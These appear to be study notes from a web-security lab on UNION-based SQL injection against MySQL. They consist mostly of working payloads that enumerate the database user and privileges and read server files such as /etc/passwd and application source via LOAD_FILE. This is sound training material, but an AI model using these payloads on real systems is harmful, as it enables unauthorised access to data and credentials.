## Privileges
#### DB User

```sql
SELECT USER() SELECT CURRENT_USER() SELECT user from mysql.user
```

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or:

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
![](Pasted%20image%2020260619122222.png)
#### User Privileges

```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
![](Pasted%20image%2020260619122544.png)

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
![](Pasted%20image%2020260619122611.png)
## LOAD_FILE

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
![](Pasted%20image%2020260619122728.png)
## Another Example

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
![](Pasted%20image%2020260619122739.png)
![](Pasted%20image%2020260619122742.png)
